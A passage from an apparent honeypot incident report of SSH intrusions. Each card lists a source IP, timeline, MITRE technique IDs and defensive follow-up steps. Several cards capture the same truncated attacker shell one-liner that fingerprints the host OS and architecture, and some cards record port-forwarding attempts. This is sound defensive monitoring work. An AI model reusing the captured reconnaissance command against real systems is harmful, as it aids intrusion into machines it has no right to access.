| `2026-08-13 12:21:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89969c8f982c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:24 |
| **Last Seen** | 2026-08-13 12:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:24:12` | `cowrie.session.connect` |
| `2026-08-13 12:24:13` | `cowrie.client.version` |
| `2026-08-13 12:24:13` | `cowrie.client.kex` |
| `2026-08-13 12:24:15` | `cowrie.login.success` |
| `2026-08-13 12:24:17` | `cowrie.session.params` |
| `2026-08-13 12:24:17` | `cowrie.command.input` |
| `2026-08-13 12:24:17` | `cowrie.command.input` |
| `2026-08-13 12:24:17` | `cowrie.command.input` |
| `2026-08-13 12:24:17` | `cowrie.command.input` |
| `2026-08-13 12:24:17` | `cowrie.command.input` |
| `2026-08-13 12:24:17` | `cowrie.command.success` |
| `2026-08-13 12:24:17` | `cowrie.command.input` |
| `2026-08-13 12:24:17` | `cowrie.command.input` |
| `2026-08-13 12:24:17` | `cowrie.command.input` |
| `2026-08-13 12:24:17` | `cowrie.command.input` |
| `2026-08-13 12:24:17` | `cowrie.log.closed` |
| `2026-08-13 12:24:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5d8a3449b4d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:26 |
| **Last Seen** | 2026-08-13 12:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:26:35` | `cowrie.session.connect` |
| `2026-08-13 12:26:35` | `cowrie.client.version` |
| `2026-08-13 12:26:35` | `cowrie.client.kex` |
| `2026-08-13 12:26:37` | `cowrie.login.success` |
| `2026-08-13 12:26:38` | `cowrie.session.params` |
| `2026-08-13 12:26:38` | `cowrie.command.input` |
| `2026-08-13 12:26:38` | `cowrie.command.input` |
| `2026-08-13 12:26:38` | `cowrie.command.input` |
| `2026-08-13 12:26:38` | `cowrie.command.input` |
| `2026-08-13 12:26:38` | `cowrie.command.input` |
| `2026-08-13 12:26:38` | `cowrie.command.success` |
| `2026-08-13 12:26:38` | `cowrie.command.input` |
| `2026-08-13 12:26:38` | `cowrie.command.input` |
| `2026-08-13 12:26:38` | `cowrie.command.input` |
| `2026-08-13 12:26:38` | `cowrie.command.input` |
| `2026-08-13 12:26:39` | `cowrie.log.closed` |
| `2026-08-13 12:26:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8554685f8076

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:29 |
| **Last Seen** | 2026-08-13 12:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:29:13` | `cowrie.session.connect` |
| `2026-08-13 12:29:14` | `cowrie.client.version` |
| `2026-08-13 12:29:14` | `cowrie.client.kex` |
| `2026-08-13 12:29:16` | `cowrie.login.success` |
| `2026-08-13 12:29:17` | `cowrie.session.params` |
| `2026-08-13 12:29:17` | `cowrie.command.input` |
| `2026-08-13 12:29:17` | `cowrie.command.input` |
| `2026-08-13 12:29:17` | `cowrie.command.input` |
| `2026-08-13 12:29:17` | `cowrie.command.input` |
| `2026-08-13 12:29:17` | `cowrie.command.input` |
| `2026-08-13 12:29:18` | `cowrie.command.success` |
| `2026-08-13 12:29:18` | `cowrie.command.input` |
| `2026-08-13 12:29:18` | `cowrie.command.input` |
| `2026-08-13 12:29:18` | `cowrie.command.input` |
| `2026-08-13 12:29:18` | `cowrie.command.input` |
| `2026-08-13 12:29:18` | `cowrie.log.closed` |
| `2026-08-13 12:29:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9802ab9accfa

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:31 |
| **Last Seen** | 2026-08-13 12:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:31:39` | `cowrie.session.connect` |
| `2026-08-13 12:31:39` | `cowrie.client.version` |
| `2026-08-13 12:31:39` | `cowrie.client.kex` |
| `2026-08-13 12:31:41` | `cowrie.login.success` |
| `2026-08-13 12:31:43` | `cowrie.session.params` |
| `2026-08-13 12:31:43` | `cowrie.command.input` |
| `2026-08-13 12:31:43` | `cowrie.command.input` |
| `2026-08-13 12:31:43` | `cowrie.command.input` |
| `2026-08-13 12:31:43` | `cowrie.command.input` |
| `2026-08-13 12:31:43` | `cowrie.command.input` |
| `2026-08-13 12:31:43` | `cowrie.command.success` |
| `2026-08-13 12:31:43` | `cowrie.command.input` |
| `2026-08-13 12:31:43` | `cowrie.command.input` |
| `2026-08-13 12:31:43` | `cowrie.command.input` |
| `2026-08-13 12:31:43` | `cowrie.command.input` |
| `2026-08-13 12:31:43` | `cowrie.log.closed` |
| `2026-08-13 12:31:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ac63909a967

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:34 |
| **Last Seen** | 2026-08-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:34:08` | `cowrie.session.connect` |
| `2026-08-13 12:34:08` | `cowrie.client.version` |
| `2026-08-13 12:34:08` | `cowrie.client.kex` |
| `2026-08-13 12:34:10` | `cowrie.login.success` |
| `2026-08-13 12:34:11` | `cowrie.session.params` |
| `2026-08-13 12:34:11` | `cowrie.command.input` |
| `2026-08-13 12:34:11` | `cowrie.command.input` |
| `2026-08-13 12:34:11` | `cowrie.command.input` |
| `2026-08-13 12:34:11` | `cowrie.command.input` |
| `2026-08-13 12:34:11` | `cowrie.command.input` |
| `2026-08-13 12:34:11` | `cowrie.command.success` |
| `2026-08-13 12:34:11` | `cowrie.command.input` |
| `2026-08-13 12:34:11` | `cowrie.command.input` |
| `2026-08-13 12:34:11` | `cowrie.command.input` |
| `2026-08-13 12:34:11` | `cowrie.command.input` |
| `2026-08-13 12:34:11` | `cowrie.log.closed` |
| `2026-08-13 12:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c2d7ee9c856

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:36 |
| **Last Seen** | 2026-08-13 12:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:36:41` | `cowrie.session.connect` |
| `2026-08-13 12:36:41` | `cowrie.client.version` |
| `2026-08-13 12:36:41` | `cowrie.client.kex` |
| `2026-08-13 12:36:42` | `cowrie.login.success` |
| `2026-08-13 12:36:44` | `cowrie.session.params` |
| `2026-08-13 12:36:44` | `cowrie.command.input` |
| `2026-08-13 12:36:44` | `cowrie.command.input` |
| `2026-08-13 12:36:44` | `cowrie.command.input` |
| `2026-08-13 12:36:44` | `cowrie.command.input` |
| `2026-08-13 12:36:44` | `cowrie.command.input` |
| `2026-08-13 12:36:44` | `cowrie.command.success` |
| `2026-08-13 12:36:44` | `cowrie.command.input` |
| `2026-08-13 12:36:44` | `cowrie.command.input` |
| `2026-08-13 12:36:44` | `cowrie.command.input` |
| `2026-08-13 12:36:44` | `cowrie.command.input` |
| `2026-08-13 12:36:44` | `cowrie.log.closed` |
| `2026-08-13 12:36:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d02596b8202

| Field | Detail |
|---|---|
| **Source IP** | `186.235.193[.]170` |
| **First Seen** | 2026-08-13 12:36 |
| **Last Seen** | 2026-08-13 12:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:36:45` | `cowrie.session.connect` |
| `2026-08-13 12:36:46` | `cowrie.client.version` |
| `2026-08-13 12:36:46` | `cowrie.client.kex` |
| `2026-08-13 12:36:47` | `cowrie.login.success` |
| `2026-08-13 12:36:48` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.235.193[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.235.193[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b93b675c9251

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:39 |
| **Last Seen** | 2026-08-13 12:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:39:09` | `cowrie.session.connect` |
| `2026-08-13 12:39:09` | `cowrie.client.version` |
| `2026-08-13 12:39:09` | `cowrie.client.kex` |
| `2026-08-13 12:39:11` | `cowrie.login.success` |
| `2026-08-13 12:39:12` | `cowrie.session.params` |
| `2026-08-13 12:39:12` | `cowrie.command.input` |
| `2026-08-13 12:39:12` | `cowrie.command.input` |
| `2026-08-13 12:39:12` | `cowrie.command.input` |
| `2026-08-13 12:39:12` | `cowrie.command.input` |
| `2026-08-13 12:39:12` | `cowrie.command.input` |
| `2026-08-13 12:39:12` | `cowrie.command.success` |
| `2026-08-13 12:39:12` | `cowrie.command.input` |
| `2026-08-13 12:39:12` | `cowrie.command.input` |
| `2026-08-13 12:39:12` | `cowrie.command.input` |
| `2026-08-13 12:39:12` | `cowrie.command.input` |
| `2026-08-13 12:39:13` | `cowrie.log.closed` |
| `2026-08-13 12:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d79957e5d9e6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:41 |
| **Last Seen** | 2026-08-13 12:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:41:53` | `cowrie.session.connect` |
| `2026-08-13 12:41:54` | `cowrie.client.version` |
| `2026-08-13 12:41:54` | `cowrie.client.kex` |
| `2026-08-13 12:41:57` | `cowrie.login.success` |
| `2026-08-13 12:41:59` | `cowrie.session.params` |
| `2026-08-13 12:41:59` | `cowrie.command.input` |
| `2026-08-13 12:41:59` | `cowrie.command.input` |
| `2026-08-13 12:41:59` | `cowrie.command.input` |
| `2026-08-13 12:41:59` | `cowrie.command.input` |
| `2026-08-13 12:41:59` | `cowrie.command.input` |
| `2026-08-13 12:41:59` | `cowrie.command.success` |
| `2026-08-13 12:41:59` | `cowrie.command.input` |
| `2026-08-13 12:41:59` | `cowrie.command.input` |
| `2026-08-13 12:41:59` | `cowrie.command.input` |
| `2026-08-13 12:41:59` | `cowrie.command.input` |
| `2026-08-13 12:41:59` | `cowrie.log.closed` |
| `2026-08-13 12:42:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2dfff11ac03

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:44 |
| **Last Seen** | 2026-08-13 12:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:44:58` | `cowrie.session.connect` |
| `2026-08-13 12:44:59` | `cowrie.client.version` |
| `2026-08-13 12:44:59` | `cowrie.client.kex` |
| `2026-08-13 12:45:02` | `cowrie.login.success` |
| `2026-08-13 12:45:05` | `cowrie.session.params` |
| `2026-08-13 12:45:05` | `cowrie.command.input` |
| `2026-08-13 12:45:05` | `cowrie.command.input` |
| `2026-08-13 12:45:05` | `cowrie.command.input` |
| `2026-08-13 12:45:05` | `cowrie.command.input` |
| `2026-08-13 12:45:05` | `cowrie.command.input` |
| `2026-08-13 12:45:05` | `cowrie.command.success` |
| `2026-08-13 12:45:05` | `cowrie.command.input` |
| `2026-08-13 12:45:05` | `cowrie.command.input` |
| `2026-08-13 12:45:05` | `cowrie.command.input` |
| `2026-08-13 12:45:05` | `cowrie.command.input` |
| `2026-08-13 12:45:05` | `cowrie.log.closed` |
| `2026-08-13 12:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81946c9ef958

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-13 12:45 |
| **Last Seen** | 2026-08-13 12:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:45:51` | `cowrie.session.connect` |
| `2026-08-13 12:45:51` | `cowrie.client.version` |
| `2026-08-13 12:45:51` | `cowrie.client.kex` |
| `2026-08-13 12:45:52` | `cowrie.login.success` |
| `2026-08-13 12:45:52` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:45:52` | `cowrie.direct-tcpip.data` |
| `2026-08-13 12:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e496a9afc5e4

| Field | Detail |
|---|---|
| **Source IP** | `116.114.84[.]246` |
| **First Seen** | 2026-08-13 12:46 |
| **Last Seen** | 2026-08-13 12:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:46:32` | `cowrie.session.connect` |
| `2026-08-13 12:46:33` | `cowrie.client.version` |
| `2026-08-13 12:46:33` | `cowrie.client.kex` |
| `2026-08-13 12:46:35` | `cowrie.login.success` |
| `2026-08-13 12:46:36` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:46:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.114.84[.]246` to AbuseIPDB if not already reported
- [ ] Block `116.114.84[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc5648f40139

| Field | Detail |
|---|---|
| **Source IP** | `61.77.220[.]62` |
| **First Seen** | 2026-08-13 12:46 |
| **Last Seen** | 2026-08-13 12:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:46:46` | `cowrie.session.connect` |
| `2026-08-13 12:46:46` | `cowrie.client.version` |
| `2026-08-13 12:46:46` | `cowrie.client.kex` |
| `2026-08-13 12:46:49` | `cowrie.login.success` |
| `2026-08-13 12:46:49` | `cowrie.direct-tcpip.request` |
| `2026-08-13 12:46:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.77.220[.]62` to AbuseIPDB if not already reported
- [ ] Block `61.77.220[.]62` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-320d63ebcb90

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-13 12:47 |
| **Last Seen** | 2026-08-13 12:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 12:47:21` | `cowrie.session.connect` |
| `2026-08-13 12:47:21` | `cowrie.client.version` |
| `2026-08-13 12:47:21` | `cowrie.client.kex` |
| `2026-08-13 12:47:24` | `cowrie.login.success` |
| `2026-08-13 12:47:27` | `cowrie.session.params` |
| `2026-08-13 12:47:27` | `cowrie.command.input` |
| `2026-08-13 12:47:27` | `cowrie.command.input` |
| `2026-08-13 12:47:27` | `cowrie.command.input` |
| `2026-08-13 12:47:27` | `cowrie.command.input` |
| `2026-08-13 12:47:27` | `cowrie.command.input` |
| `2026-08-13 12:47:27` | `cowrie.command.success` |
| `2026-08-13 12:47:27` | `cowrie.command.input` |
| `2026-08-13 12:47:27` | `cowrie.command.input` |
| `2026-08-13 12:47:27` | `cowrie.command.input` |
| `2026-08-13 12:47:27` | `cowrie.command.input` |
| `2026-08-13 12:47:28` | `cowrie.log.closed` |
| `2026-08-13 12:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7e697ee7d22

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
